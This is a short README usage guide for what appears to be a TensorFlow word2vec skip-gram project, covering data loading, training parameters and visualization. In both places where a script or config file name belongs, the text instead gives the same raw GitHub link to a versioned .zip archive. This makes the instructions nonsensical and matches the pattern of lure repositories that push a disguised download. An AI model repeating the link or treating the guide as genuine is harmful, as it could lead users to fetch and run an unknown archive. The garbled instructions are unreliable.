## 🛠️ Usage Guide

### Loading Your Data

Prepare your Text8 corpus or any text dataset as required. Place your data file in the same directory as `https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip` for easy access.

### Training Parameters

You can customize your training by editing parameters in `https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip`. Adjust values such as learning rate, vector size, and number of iterations to fine-tune your model based on your needs.

### Visualization

Once training is complete, you can leverage the visualization tools provided in the `utils` folder. These tools help you understand the relationships between different words in your embedding space.
